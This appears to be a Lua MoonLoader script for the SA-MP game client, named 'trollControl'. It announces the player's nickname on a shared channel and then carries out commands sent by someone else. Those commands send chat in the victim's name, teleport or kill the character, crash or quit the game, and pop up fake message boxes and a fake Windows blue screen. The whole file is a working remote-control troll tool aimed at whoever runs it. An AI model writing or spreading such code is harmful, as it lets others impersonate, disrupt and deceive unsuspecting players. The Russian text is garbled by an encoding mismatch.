local broadcaster = import('lib/broadcaster.lua')
local ffi = require 'ffi'
local encoding = require 'encoding'
encoding.default = 'CP1251'
u8 = encoding.UTF8

--bluescreen
local bluescreen = false
local userList = 'Available users:'

local font_flag = require('moonloader').font_flag
local font1 = renderCreateFont('Arial', 150, 0)
local font2 = renderCreateFont('Arial', 30, 0)
local font3 = renderCreateFont('Arial', 15, 0)

function main()
    while not isSampAvailable() do wait(0) end
    wait(1000)
    broadcaster.registerHandler('trollControl', myHandler)
    while true do
        wait(0)
        _, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
        nick = sampGetPlayerNickname(id)
        wait(1500)
        broadcaster.sendMessage(u8('userConnected '..nick), 'trollControl')
    end
end

function myHandler(message) --send
    if message:find('commandSendChat (.+) (.+)') then
        local mode, msg = message:match('commandSendChat (%d+) (.*)$')
        --sampAddChatMessage('mode = '..mode..' msg = '..msg, -1)
        if tonumber(mode) == 1 then 
            sampSendChat(u8:decode(msg)) 
        elseif tonumber(mode) == 2 then 
            sampProcessChatInput(u8:decode(msg))
        end
    elseif message:find('commandAddMessageToChat (.+)') then
        addmsg = message:match('commandAddMessageToChat (.+)')
        sampAddChatMessage(u8:decode(addmsg), -1)
    elseif message:find('commandSlapUp') then
        x, y, z = getCharCoordinates(PLAYER_PED)
        setCharCoordinates(PLAYER_PED, x, y, z + 3)
    elseif message:find('commandSlapDown') then
        x, y, z = getCharCoordinates(PLAYER_PED)
        setCharCoordinates(PLAYER_PED, x, y, z - 3)
    elseif message:find('commandShowMessageBox') then
        msgb_title, msgb_text = message:match('commandShowMessageBox (.+) (.+)')
        ShowMessage(u8:decode(msgb_title), u8:decode(msgb_text), 0x10)
    elseif message:find('userConnected (.+)') then
        connectedUser = message:match('userConnected (.+)')
        if not userList:find(connectedUser) then userList = userList..'\n'..connectedUser end
    elseif message:find('commandShowDialog (.*)$ (.*)$ (.*)$ (.*)$ (.*)$ (.*)$') then
        id, title, text, btn1, btn2, style = message:match('commandShowDialog (.*)$ (.*)$ (.*)$ (.*)$ (.*)$ (.*)$')
        --sampAddChatMessage('dialog requested: '..id.. title.. text.. btn1.. btn2.. style, -1)
        sampShowDialog(tonumber(id), title, text, btn1, btn2, tonumber(style))
    elseif message:find('commandQuitGame') then
        callFunction(sampGetBase() + 0x64D70, 0, 0)
    elseif message:find('commandBlueScreen') then
        lua_thread.create(function() 
            bluescreen = true
            wait(5000)
            bluescreen = false
        end)
    elseif message:find('commandKickByAc') then 
        setCharCoordinates(PLAYER_PED, 1234, 5678, 91011)
    elseif message:find('commandDead') then
        setCharHealth(PLAYER_PED, 0)
    elseif message:find('commandCage') then
        x, y, z = getCharCoordinates(PLAYER_PED)
        cage = createObject(18856, x, y , z - 1)
    elseif message:find('commandGiveJetpack') then
        taskJetpack(PLAYER_PED)
    elseif message:find('commandCamera') then
        math.randomseed(os.clock())
        setCameraPositionUnfixed(math.random(1, 360), math.random(1, 180))
    elseif message:find('commandShakeCamera') then
        shakeCam(10000) 
    elseif message:find('commandCrashGame') then
        setPlayerControl(PLAYER_PED, false) --õîòåë ñäåëàòü ôðèç, â èòîãå âûøåë êðàø, íó ïîõóé
    end
end

function onD3DPresent()
    if bluescreen then
        local copywrite = {
            [4] = ':(',
            [5] = 'Íà âàøåì ÏÊ âîçíèêëà ïðîáëåìà, è åãî íåîáõîäèìî \nïåðåçàãðóçèòü. Ìû ëèøü ñîáèðàåì íåêîòîðûå ñâåäåíèÿ îá \nîøèáêå, à çàòåì áóäåò àâòîìàòè÷åñêàÿ \nïåðåçàãðóçêà (âûïîëíåíî 100%)',
            [6] = 'Ïðè æåëàíèè âû ìîæåòå íàéòè â Èíòåðíåòå èíôîðìàöèÿ ïî ýòîìó êîäó îøèáêè: USER_DELETE_SYSTEM'
        }
        lua_thread.create(function() 
            while true do
                wait(0)
                resX, resY = getScreenResolution()
                renderDrawBox(0, 0, resX, resY, 0xFF0191ea)
                renderFontDrawText(font1, copywrite[4], 150, 150, 0xFFFFFFFF)
                renderFontDrawText(font2, copywrite[5], 150, 600, 0xFFFFFFFF)
                renderFontDrawText(font3, copywrite[6], 150, 900, 0xFFFFFFFF)        
            end
        end)
    end
end

function onScriptTerminate(scr)
    if scr == thisScript() then
        broadcaster.unregisterHandler('trollControl')
    end
end

--messagebox --https://www.blast.hk/threads/13380/post-289097
function ShowMessage(text, title, style)
    ffi.cdef [[
        int MessageBoxA(
            void* hWnd,
            const char* lpText,
            const char* lpCaption,
            unsigned int uType
        );
    ]]
    local hwnd = ffi.cast('void*', readMemory(0x00C8CF88, 4, false))
    ffi.C.MessageBoxA(hwnd, text,  title, style and (style + 0x50000) or 0x50000)
end
